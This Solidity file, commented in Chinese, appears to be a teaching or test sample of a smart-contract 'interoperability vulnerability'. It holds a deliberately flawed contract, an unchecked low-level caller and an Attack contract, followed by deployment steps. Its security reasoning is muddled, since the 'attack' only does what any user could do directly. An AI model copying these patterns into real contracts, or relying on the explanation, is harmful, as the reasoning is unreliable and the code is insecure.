// Vulnerability Code (存在合約互通性漏洞範例)
// 說明：
// 此漏洞示範因舊版介面與新版本編譯器使用上的不一致，在呼叫合約時沒有正確使用靜態呼叫方式，加上原本設計為 view 的介面實際上仍修改狀態，可能被攻擊者利用來干擾系統狀態。

pragma solidity >=0.8.0;

// 模擬舊版的合約，此合約原意應該宣告為 constant/view，但實際上修改了狀態變數，
// 這在新版本編譯器中已不被允許，因此實作上已移除 view 修飾詞，但介面定義仍可能造成誤解。
contract VulnerableConstant {
    // 狀態變數：計數器
    uint public counter; // 漏洞重點：counter 被不當修改

    // 此函式原本意圖宣告為 view，但實際上修改狀態，導致介面與實作不符
    function myFunction() public returns (uint) {
        // 漏洞重點：意圖為純讀取操作但實際上修改 counter
        counter++;
        return counter;
    }
}

// 新版合約，嘗試呼叫舊合約的 myFunction，但因介面不一致，使用了 call 而非靜態呼叫（staticcall），
// 造成互通性問題，可能導致不可預期行為
contract VulnerableNewContract {
    // 此函式利用 call 直接傳遞 call data，未使用視圖函式專用的 staticcall
    function doSomething(address _addr) public returns (bool) {
        // 漏洞重點：使用 _addr.call 時，abi.encodeWithSignature 參數必須為字串常數
        // 錯誤示範中，可能用錯誤的 encoding 方式，但此處正確使用字串 "myFunction()" 來模擬漏洞前之不當介面
        (bool success, ) = _addr.call(abi.encodeWithSignature("myFunction()"));
        // 注意：缺少對 success 的嚴格驗證可能會導致後續邏輯在狀態不正確時執行
        return success;
    }
}

// 攻擊合約，用於示範攻擊者如何藉由呼叫 VulnerableNewContract 來間接修改 VulnerableConstant 的狀態
contract Attack {
    VulnerableNewContract public target;
    VulnerableConstant public victim;

    // 部署時傳入目標合約位址與受害合約位址
    constructor(address _target, address _victim) {
        target = VulnerableNewContract(_target);
        victim = VulnerableConstant(_victim);
    }

    // 攻擊步驟：呼叫 target 合約的 doSomething，進而觸發 victim 合約的 myFunction 來修改 counter
    function executeAttack() public returns (uint) {
        // 執行攻擊：呼叫 doSomething 使 victim.counter 被修改
        bool success = target.doSomething(address(victim));
        require(success, "Call to victim failed");
        // 回傳 victim 合約中 counter 的數值，可用以驗證攻擊效果
        return victim.counter();
    }
}

/*
測試流程：
1. 部署 VulnerableConstant 合約，取得其位址。
2. 部署 VulnerableNewContract 合約，取得其位址。
3. 部署 Attack 合約，傳入 VulnerableNewContract 和 VulnerableConstant 的位址。
4. 呼叫 Attack 合約的 executeAttack() 函式，可以觀察到 victim.counter 被不當修改，顯示漏洞存在。
*/